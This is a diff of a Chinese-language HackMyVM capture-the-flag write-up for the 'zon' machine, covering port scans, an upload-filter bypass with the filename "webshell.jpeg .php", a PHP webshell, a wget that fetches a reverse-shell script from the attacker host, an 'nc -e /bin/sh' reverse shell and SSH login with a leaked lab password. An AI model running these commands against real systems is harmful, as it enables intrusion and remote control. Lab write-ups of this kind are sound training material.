@@ -3,19 +3,19 @@ title: zon
 tags:
   - sec/hackmyvm
 date: 2024-02-11T10:52:40
-lastmod: 2024-11-24T18:56:34
+lastmod: 2024-11-24T19:13:11
 toc: "true"
 ---
 ## 启动机器
 得指定网络接口
-```
+```bash
 sudo arp-scan -I eth5 -l
 ```
 ![HMM_zon_image_1](https://img.l1uyun.one/HMM_zon_image_1.png)
 
 ## 端口扫描
 
-```
+```bash
 sudo rustscan -a 192.168.10.13 -r 1-65535 -t 8000 --ulimit 5000
 
 sudo nmap 192.168.10.13 -sT -Pn -p22,80 -sV -sC -O -oN portscan/norm
@@ -42,32 +42,31 @@ sudo nmap 192.168.10.13 -sT -Pn -p22,80 --script=vuln -oN portscan/vuln
 后面尝试了图片马, 但是没有正常解析, 无法执行命令
 
 使用空格绕过
-```
+```bash
 "webshell.jpeg .php"
 ```
 ![HMM_zon_image_9](https://img.l1uyun.one/HMM_zon_image_9.png)
-2024-09-18T11:13:29
-这里肯定是有个错误配置导致也解析了,当时拿到shell之后没有去看
+
 
 一句话木马, 获得 webshell
 ![HMM_zon_image_10](https://img.l1uyun.one/HMM_zon_image_10.png)
 freddie
 ## webshell
 上传一个反向 shell
-```
+```bash
 wget http://192.168.10.11:8000/php-reverse-shell.php -O /tmp/shell.php
 ```
 
 
 吐了, 不清楚为啥反向 shell, 不稳定, 执行不了命令, 使用 nohup 也没有稳定下来
 
-```
+```bash
 nohup nc -e /bin/sh 192.168.10.11 1234
 ```
 ![HMM_zon_image_11|650](https://img.l1uyun.one/HMM_zon_image_11.png)
 
 ## 利用脚本中泄露的mysql密码
-```
+```bash
 
 #!/bin/bash
 
@@ -97,11 +96,11 @@ fi
 最后使用 meterpreter 的这个更高级的 shell 成功了
 ![HMM_zon_image_12](https://img.l1uyun.one/HMM_zon_image_12.png)
 ## user. txt PWD
-```
+```bash
 Freddie  | LDVK@dYiEa2I1lnjrEeoMif 
 ```
 ![HMM_zon_image_13](https://img.l1uyun.one/HMM_zon_image_13.png)
-```
+```bash
 ssh freddie@192.168.10.11
 LDVK@dYiEa2I1lnjrEeoMif 
 ```
